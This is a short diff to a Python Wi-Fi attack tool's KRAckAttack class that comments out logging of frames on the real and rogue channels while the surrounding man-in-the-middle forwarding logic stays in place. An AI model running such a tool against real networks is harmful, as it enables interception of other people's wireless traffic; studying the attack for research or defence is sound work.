@@ -677,15 +677,15 @@ class KRAckAttack():
 			might_forward = p.addr1 in self.clients and self.clients[p.addr1].should_forward(p)
 			might_forward = might_forward or (args.group and dot11_is_group(p) and p.haslayer(Dot11WEP))
 
-			# Pay special attention to Deauth and Disassoc frames
-			if p.haslayer(Dot11Deauth) or p.haslayer(Dot11Disas):
-				print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing" if might_forward else None)
-			# If targeting a specific client, display all frames it sends
-			elif self.clientmac is not None and self.clientmac == p.addr1:
-				print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing" if might_forward else None)
-			# For other clients, just display what might be forwarded
-			elif might_forward:
-				print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing")
+			# # Pay special attention to Deauth and Disassoc frames
+			# if p.haslayer(Dot11Deauth) or p.haslayer(Dot11Disas):
+			# 	print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing" if might_forward else None)
+			# # If targeting a specific client, display all frames it sends
+			# elif self.clientmac is not None and self.clientmac == p.addr1:
+			# 	print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing" if might_forward else None)
+			# # For other clients, just display what might be forwarded
+			# elif might_forward:
+			# 	print_rx(INFO, "Real channel ", p, suffix=" -- MitM'ing")
 
 			# Now perform actual actions that need to be taken, along with additional output
 			if might_forward:
@@ -731,7 +731,7 @@ class KRAckAttack():
 
 			# Check if it's a new client that we can MitM
 			if p.haslayer(Dot11Auth):
-				print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing")
+				# print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing")
 				self.clients[p.addr2] = ClientState(p.addr2)
 				self.clients[p.addr2].mark_got_mitm()
 				client = self.clients[p.addr2]
@@ -740,7 +740,7 @@ class KRAckAttack():
 			elif p.addr2 in self.clients:
 				client = self.clients[p.addr2]
 				will_forward = client.should_forward(p)
-				print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing" if will_forward else None)
+				# print_rx(INFO, "Rogue channel", p, suffix=" -- MitM'ing" if will_forward else None)
 
 			# Always display all frames sent by the targeted client
 			# elif p.addr2 == self.clientmac:
